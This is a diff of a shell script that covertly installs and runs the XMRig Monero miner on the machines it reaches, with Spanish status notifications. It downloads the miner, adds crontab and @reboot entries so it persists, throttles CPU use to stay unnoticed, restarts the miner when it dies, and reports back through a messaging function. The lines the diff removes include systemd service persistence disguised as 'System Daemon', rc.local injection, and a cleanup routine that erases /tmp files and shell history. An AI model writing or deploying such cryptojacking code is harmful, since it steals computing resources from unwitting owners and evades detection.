@@ -61,19 +61,6 @@ D() {
         fi
     fi
     
-    if command -v python3 >/dev/null 2>&1; then
-        python3 -c "
-import urllib.request, ssl
-ssl._create_default_https_context = ssl._create_unverified_context
-try:
-    urllib.request.urlretrieve('$URL', '$OUTPUT')
-    exit(0)
-except:
-    exit(1)
-" 2>/dev/null
-        [ $? -eq 0 ] && return 0
-    fi
-    
     return 1
 }
 
@@ -100,45 +87,11 @@ E() {
     if command -v crontab >/dev/null 2>&1; then
         TEMP_CRON="$(mktemp 2>/dev/null || echo /tmp/cron_$$)"
         crontab -l 2>/dev/null | grep -v "$SCRIPT_PATH" > "$TEMP_CRON" 2>/dev/null
-        echo "*/5 * * * $((RANDOM % 6)) $SCRIPT_PATH >/dev/null 2>&1" >> "$TEMP_CRON"
-        echo "@reboot sleep $((RANDOM % 120 + 30)) && $SCRIPT_PATH >/dev/null 2>&1" >> "$TEMP_CRON"
+        echo "*/10 * * * * $SCRIPT_PATH >/dev/null 2>&1" >> "$TEMP_CRON"
+        echo "@reboot sleep $((RANDOM % 60 + 30)) && $SCRIPT_PATH >/dev/null 2>&1" >> "$TEMP_CRON"
         crontab "$TEMP_CRON" 2>/dev/null
         rm -f "$TEMP_CRON"
     fi
-    
-    if command -v systemctl >/dev/null 2>&1 && [ -w /etc/systemd/system ]; then
-        SERVICE_NAME="systemd-$(head -c 8 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 6)"
-        
-        cat > "/etc/systemd/system/${SERVICE_NAME}.service" 2>/dev/null << EOF
-[Unit]
-Description=System Daemon
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=$SCRIPT_PATH
-Restart=always
-RestartSec=60
-User=root
-Nice=19
-IOSchedulingClass=idle
-
-[Install]
-WantedBy=multi-user.target
-EOF
-        
-        systemctl daemon-reload >/dev/null 2>&1
-        systemctl enable "$SERVICE_NAME" --now >/dev/null 2>&1
-    fi
-    
-    RC_FILES="/etc/rc.local /etc/rc.d/rc.local /etc/init.d/rc.local"
-    for RC_FILE in $RC_FILES; do
-        if [ -f "$RC_FILE" ] && [ -w "$RC_FILE" ]; then
-            if ! grep -q "$SCRIPT_PATH" "$RC_FILE" 2>/dev/null; then
-                sed -i "/^exit 0/i\\$SCRIPT_PATH >/dev/null 2>&1 &" "$RC_FILE" 2>/dev/null
-            fi
-        fi
-    done
 }
 
 X() {
@@ -146,34 +99,10 @@ X() {
     
     case "$ARCH" in
         x86_64|amd64)
-            if [ -f /etc/os-release ]; then
-                . /etc/os-release
-                case "$VERSION_CODENAME" in
-                    noble)
-                        echo "noble-x64"
-                        ;;
-                    focal)
-                        echo "focal-x64"
-                        ;;
-                    jammy)
-                        echo "jammy-x64"
-                        ;;
-                    *)
-                        echo "linux-static-x64"
-                        ;;
-                esac
-            else
-                echo "linux-static-x64"
-            fi
+            echo "linux-static-x64"
             ;;
         aarch64|arm64)
             echo "linux-static-arm64"
-            ;;
-        armv7l|armv8l)
-            echo "linux-static-armhf"
-            ;;
-        i386|i486|i586|i686)
-            echo "linux-static-x86"
             ;;
         *)
             echo "linux-static-x64"
@@ -190,7 +119,7 @@ Y() {
     
     THREADS=$((CPU_COUNT * 3 / 4))
     [ $THREADS -lt 1 ] && THREADS=1
-    [ $THREADS -gt 8 ] && THREADS=8
+    [ $THREADS -gt 4 ] && THREADS=4
     
     echo $THREADS
 }
@@ -206,56 +135,22 @@ Z() {
 
 I() {
     TARGET_DIR="$1"
-    ARCH_TYPE="$2"
     
-    BASE_URL="https://github.com/xmrig/xmrig/releases/download/v6.25.0"
-    
-    case "$ARCH_TYPE" in
-        noble-x64)
-            URLS="${BASE_URL}/xmrig-6.25.0-noble-x64.tar.gz"
-            ;;
-        focal-x64)
-            URLS="${BASE_URL}/xmrig-6.25.0-focal-x64.tar.gz"
-            ;;
-        jammy-x64)
-            URLS="${BASE_URL}/xmrig-6.25.0-jammy-x64.tar.gz"
-            ;;
-        linux-static-x64)
-            URLS="${BASE_URL}/xmrig-6.25.0-linux-static-x64.tar.gz"
-            ;;
-        linux-static-arm64)
-            URLS="${BASE_URL}/xmrig-6.25.0-linux-static-arm64.tar.gz"
-            ;;
-        linux-static-armhf)
-            URLS="${BASE_URL}/xmrig-6.25.0-linux-static-armhf.tar.gz"
-            ;;
-        linux-static-x86)
-            URLS="${BASE_URL}/xmrig-6.25.0-linux-static-x86.tar.gz"
-            ;;
-        *)
-            URLS="${BASE_URL}/xmrig-6.25.0-linux-static-x64.tar.gz"
-            ;;
-    esac
-    
-    FALLBACK_URL="${BASE_URL}/xmrig-6.25.0-linux-static-x64.tar.gz"
+    URL="https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
     
     TAR_FILE="${TARGET_DIR}/xmrig.tar.gz"
     
-    for URL in $URLS $FALLBACK_URL; do
-        if D "$URL" "$TAR_FILE"; then
-            tar -xzf "$TAR_FILE" -C "$TARGET_DIR" --strip-components=1 2>/dev/null
-            rm -f "$TAR_FILE" 2>/dev/null
-            
-            for BIN_PATH in "$TARGET_DIR/xmrig" "$TARGET_DIR/xmrig-6.25.0/xmrig"; do
-                if [ -f "$BIN_PATH" ]; then
-                    chmod +x "$BIN_PATH" 2>/dev/null
-                    N "✅ **XMRIG DESCARGADO**\n📦 Versión: 6.25.0\n🏗️  Arquitectura: $ARCH_TYPE\n📂 Directorio: $TARGET_DIR"
-                    echo "$BIN_PATH"
-                    return 0
-                fi
-            done
+    if D "$URL" "$TAR_FILE"; then
+        tar -xzf "$TAR_FILE" -C "$TARGET_DIR" --strip-components=1 2>/dev/null
+        rm -f "$TAR_FILE" 2>/dev/null
+        
+        if [ -f "$TARGET_DIR/xmrig" ]; then
+            chmod +x "$TARGET_DIR/xmrig" 2>/dev/null
+            N "✅ **XMRIG DESCARGADO**\n📦 Versión: 6.25.0\n🏗️  Arquitectura: static-x64"
+            echo "$TARGET_DIR/xmrig"
+            return 0
         fi
-    done
+    fi
     
     return 1
 }
@@ -266,35 +161,43 @@ M() {
     THREADS="$3"
     RIG_ID="$4"
     
-    nohup "$BIN_PATH" \
+    # Verificar que el binario existe y es ejecutable
+    if [ ! -f "$BIN_PATH" ] || [ ! -x "$BIN_PATH" ]; then
+        return 1
+    fi
+    
+    # Ejecutar con menos opciones para mayor compatibilidad
+    "$BIN_PATH" \
         -o "$POOL" \
         -u "$W" \
         --rig-id="$RIG_ID" \
         --pass="x" \
         --donate-level=1 \
         --threads="$THREADS" \
-        --cpu-max-threads-hint=50 \
         --cpu-priority=0 \
         --no-color \
         --background \
-        --quiet \
         --syslog \
         --randomx-init=1 \
-        --randomx-mode=fast \
-        --randomx-no-numa \
-        --max-cpu-usage=75 \
+        --max-cpu-usage=65 \
         --print-time=0 \
-        --health-print-time=0 \
-        >/dev/null 2>&1 &
+        >/tmp/xmrig.log 2>&1 &
     
-    sleep 3
-    if kill -0 $! 2>/dev/null; then
-        N "⚡ **MINERÍA INICIADA**\n⛏️  Pool: $POOL\n🧵 Threads: $THREADS\n🆔 Rig ID: $RIG_ID\n💰 Wallet: ${W:0:12}...${W: -12}"
-        echo $!
+    PID=$!
+    sleep 5
+    
+    if kill -0 $PID 2>/dev/null; then
+        N "⚡ **MINERÍA INICIADA**\n⛏️  Pool: $POOL\n🧵 Threads: $THREADS\n🆔 Rig ID: $RIG_ID\n💰 Wallet: ${W:0:8}...${W: -8}"
+        echo $PID
         return 0
+    else
+        # Verificar log de error
+        if [ -f /tmp/xmrig.log ]; then
+            ERROR=$(tail -5 /tmp/xmrig.log)
+            N "❌ **ERROR INICIANDO**\n💥 Pool: $POOL\n📄 Log: ${ERROR:0:100}"
+        fi
+        return 1
     fi
-    
-    return 1
 }
 
 monitor_miner() {
@@ -307,13 +210,13 @@ monitor_miner() {
     STATUS_INTERVAL=10800
     
     while true; do
-        sleep 600
+        sleep 300
         
         CURRENT_TIME=$(date +%s)
         
         if [ $((CURRENT_TIME - LAST_STATUS_TIME)) -ge $STATUS_INTERVAL ]; then
             if kill -0 "$PID" 2>/dev/null; then
-                N "📊 **ESTADO MINERO**\n✅ Activo\n⛏️  Pool: $POOL\n🧵 Threads: $THREADS\n🆔 Rig ID: $RIG_ID\n⏰ Uptime: $(( (CURRENT_TIME - LAST_STATUS_TIME) / 3600 ))h"
+                N "📊 **ESTADO ACTIVO**\n✅ Minero corriendo\n⛏️  Pool: $POOL\n🧵 Threads: $THREADS\n🆔 $RIG_ID"
                 LAST_STATUS_TIME=$CURRENT_TIME
             fi
         fi
@@ -322,35 +225,15 @@ monitor_miner() {
             NEW_PID=$(M "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID")
             if [ -n "$NEW_PID" ]; then
                 PID="$NEW_PID"
-                N "🔄 **REINICIO** Minero reiniciado (PID: $PID)"
+                N "🔄 **REINICIADO** PID: $PID"
             fi
         fi
     done
 }
 
-send_alert() {
-    ALERT_TYPE="$1"
-    MESSAGE="$2"
-    
-    case "$ALERT_TYPE" in
-        "new_host")
-            N "🔍 **NUEVO HOST DETECTADO**\n$MESSAGE"
-            ;;
-        "error")
-            N "❌ **ERROR**\n$MESSAGE"
-            ;;
-        "warning")
-            N "⚠️ **ADVERTENCIA**\n$MESSAGE"
-            ;;
-        "info")
-            N "ℹ️ **INFORMACIÓN**\n$MESSAGE"
-            ;;
-    esac
-}
-
 main() {
     if ps aux 2>/dev/null | grep -v grep | grep -q "xmrig.*$W"; then
-        send_alert "info" "Minería ya está activa en este sistema"
+        N "ℹ️ **YA ACTIVO** Minero ya está corriendo"
         exit 0
     fi
     
@@ -359,25 +242,21 @@ main() {
     WORK_DIR=$(G)
     mkdir -p "$WORK_DIR" 2>/dev/null
     if [ ! -w "$WORK_DIR" ]; then
-        send_alert "error" "No se puede escribir en directorio temporal"
         exit 0
     fi
     
     cd "$WORK_DIR" || exit 0
     
-    ARCH_TYPE=$(X)
-    
     BIN_PATH="$WORK_DIR/xmrig"
     if [ ! -f "$BIN_PATH" ] || [ ! -x "$BIN_PATH" ]; then
-        BIN_PATH=$(I "$WORK_DIR" "$ARCH_TYPE")
-        if [ -z "$BIN_PATH" ] || [ ! -x "$BIN_PATH" ]; then
-            send_alert "error" "Fallo al descargar XMRig"
+        BIN_PATH=$(I "$WORK_DIR")
+        if [ -z "$BIN_PATH" ]; then
+            N "❌ **ERROR** No se pudo descargar XMRig"
             exit 0
         fi
     fi
     
     E "$0"
-    send_alert "info" "Persistencia establecida en el sistema"
     
     THREADS=$(Y)
     
@@ -385,36 +264,27 @@ main() {
     if ! Z "$P1"; then
         POOL="$P2"
         if ! Z "$P2"; then
-            send_alert "error" "No hay conexión a pools disponibles"
+            N "❌ **ERROR POOL** Sin conexión a pools"
             exit 0
         else
-            send_alert "warning" "Pool principal caído, usando secundario: $P2"
+            N "⚠️ **POOL SECUNDARIO** Usando: $P2"
         fi
     fi
     
-    RIG_ID="m_$(hostname 2>/dev/null | head -c 3)_$(date +%H%M)"
+    RIG_ID="m_$(hostname 2>/dev/null | head -c 3)_$(date +%M%S)"
     
     PID=$(M "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID")
     if [ -n "$PID" ]; then
-        send_alert "info" "✅ Minería iniciada exitosamente\nPID: $PID\nWallet: ${W:0:8}...${W: -8}"
+        N "✅ **MINERO INICIADO**\nPID: $PID\nPool: $POOL\nThreads: $THREADS"
         
         monitor_miner "$PID" "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID" &
         
-        disown -h 2>/dev/null
-    else
-        send_alert "error" "Fallo al iniciar minero"
+        disown 2>/dev/null
     fi
-}
-
-cleanup() {
-    rm -f /tmp/.* /var/tmp/.* 2>/dev/null
-    history -c 2>/dev/null
-    unset W P1 P2 WEBHOOK_URL
 }
 
 if [ "$1" != "debug" ]; then
     main >/dev/null 2>&1 &
-    cleanup
     disown 2>/dev/null
     exit 0
 else
